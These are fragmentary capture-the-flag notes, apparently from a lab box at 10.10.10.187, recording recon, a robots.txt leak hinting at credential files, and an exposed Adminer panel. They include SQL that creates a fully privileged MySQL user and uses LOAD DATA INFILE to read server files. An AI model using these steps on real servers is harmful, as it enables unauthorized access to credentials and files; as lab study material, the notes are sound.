* nmap scan showed on port 80 /admin-dir but the dir is Forbidden*

- robots.txt had some intresting info, also we may have confirmation that /admin-dir has contacts and creds *
    User-agent: *

    # This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo (NOTE: 'waldo' could be a user)
    Disallow: /admin-dir

/contacts.txt (Status: 200)
/credentials.txt (Status: 200)

going to 10.10.10.187/utility-scripts/adminer.php
gives me the panel

CREATE USER 'raftos'@'10.10.10.187' IDENTIFIED BY 'raftos';
GRANT ALL PRIVILEGES ON *.* TO 'raftos'@'10.10.10.187';
FLUSH PRIVILEGES;

exists, seems like the default apache page
LOAD DATA INFILE '/var/www/html/index.html' INTO TABLE test FIELDS TERMINATED BY '\r';
